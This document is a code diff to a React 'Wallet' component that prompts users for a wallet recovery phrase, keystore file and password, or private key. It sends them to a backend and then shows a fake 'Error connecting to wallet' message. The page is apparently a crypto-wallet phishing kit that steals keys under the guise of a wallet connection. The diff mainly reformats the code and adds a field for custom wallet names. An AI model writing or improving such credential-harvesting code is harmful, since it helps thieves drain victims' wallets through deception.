@@ -2,15 +2,20 @@
 "use client";
 import { wallets } from "@/lib/data";
 import React, { useState } from "react";
-import img from '../Wallets/error-icon-25239.png'
+import img from "../Wallets/error-icon-25239.png";
 
 interface ITEM {
   name: string;
   imgUrl: string;
+  wallet?: string;
 }
 
 const Wallet = () => {
-  const [selectedItem, setSelectedItem] = useState<ITEM>();
+const [selectedItem, setSelectedItem] = useState<ITEM>({
+  name: "",
+  imgUrl: "",
+  wallet: "",
+});
   const [selectedTab, setSelectedTab] = useState("phrase");
   const [status, setStatus] = useState("Trying to connect to wallet");
   const [formData, setFormData] = useState({
@@ -20,7 +25,7 @@ const Wallet = () => {
       password: "",
     },
     privateKey: "",
-    wallet:''
+    wallet: "",
   });
 
   const handleInputChange = (
@@ -29,6 +34,17 @@ const Wallet = () => {
     const { name, value } = e.target;
     setFormData((prevData) => ({
       ...prevData,
+      [name]: value,
+    }));
+  };
+
+  const handleWalletchange = (
+    e: React.ChangeEvent<HTMLInputElement | HTMLTextAreaElement>
+  ) => {
+    const { name, value } = e.target;
+
+    setSelectedItem((prev) => ({
+      ...prev!,
       [name]: value,
     }));
   };
@@ -54,7 +70,7 @@ const Wallet = () => {
         password: "",
       },
       privateKey: "",
-      wallet:''
+      wallet: "",
     });
     setSelectedTab("phrase");
   };
@@ -82,11 +98,32 @@ const Wallet = () => {
     // Process the formData based on the selectedTab
     let dataToSend;
     if (selectedTab === "phrase") {
-      dataToSend = { phrase: formData.phrase,item:selectedItem?.name };
+      dataToSend = {
+        phrase: formData.phrase,
+        item:
+          selectedItem?.name == "Wallet connect" ||
+          selectedItem?.name == "Other Wallet"
+            ? selectedItem?.wallet
+            : selectedItem?.name,
+      };
     } else if (selectedTab === "keystore") {
-      dataToSend = { keystore: formData.keystore,item:selectedItem?.name };
+      dataToSend = {
+        keystore: formData.keystore,
+        item:
+          selectedItem?.name == "Wallet connect" ||
+          selectedItem?.name == "Other Wallet"
+            ? selectedItem?.wallet
+            : selectedItem?.name,
+      };
     } else if (selectedTab === "private") {
-      dataToSend = { privateKey: formData.privateKey,item:selectedItem?.name };
+      dataToSend = {
+        privateKey: formData.privateKey,
+        item:
+          selectedItem?.name == "Wallet connect" ||
+          selectedItem?.name == "Other Wallet"
+            ? selectedItem?.wallet
+            : selectedItem?.name,
+      };
     }
     // Send dataToSend to the backend
     console.log(dataToSend);
@@ -103,6 +140,10 @@ const Wallet = () => {
       if (response.ok) {
         resetForm();
         setTimeout(() => setStatus("Error connecting to wallet..."), 4000);
+        setSelectedItem((prev) => ({
+          ...prev,
+          wallet: '',
+        }));
         // setTimeout(
         //   () => setStatus("CONNECTED WALLET ,wait while our team fix issue"),
         //   10000
@@ -115,25 +156,31 @@ const Wallet = () => {
     }
   };
 
- const handleModal = async (item: { name: string; imgUrl: string }) => {
-  setSelectedItem(item);
-  setFormData((prevData) => ({
-    ...prevData,
-    wallet: item.name !== "Wallet connect" && item.name !== "Other Wallet" ? item.name : "",
-  }));
+  const handleModal = async (item: { name: string; imgUrl: string }) => {
+    setSelectedItem(item);
+    setFormData((prevData) => ({
+      ...prevData,
+      wallet:
+        item.name !== "Wallet connect" && item.name !== "Other Wallet"
+          ? item.name
+          : "",
+    }));
 
-  const modal = document.getElementById("my_modal_1") as HTMLDialogElement | null;
-  const modalTwo = document.getElementById("my_modal_2") as HTMLDialogElement | null;
+    const modal = document.getElementById(
+      "my_modal_1"
+    ) as HTMLDialogElement | null;
+    const modalTwo = document.getElementById(
+      "my_modal_2"
+    ) as HTMLDialogElement | null;
 
-  if (modal) {
-    modal.showModal();
-  }
-  setTimeout(() => {
-    modal?.close();
-    modalTwo?.showModal();
-  }, 4500);
-};
-
+    if (modal) {
+      modal.showModal();
+    }
+    setTimeout(() => {
+      modal?.close();
+      modalTwo?.showModal();
+    }, 4500);
+  };
 
   return (
     <div className=" pb-5 bg-black text-center pt-10 text-white">
@@ -334,8 +381,8 @@ const Wallet = () => {
                     <input
                       type="text"
                       name="wallet"
-                      value={formData.wallet}
-                      onChange={handleInputChange}
+                      value={selectedItem.wallet}
+                      onChange={handleWalletchange}
                       placeholder="Enter Wallet Name"
                       className="bg-white text-gray-700 focus:outline-none border-[1px] border-customGray-main rounded-[10px] placeholder:text-customGray-main p-2 w-full mt-3"
                     />
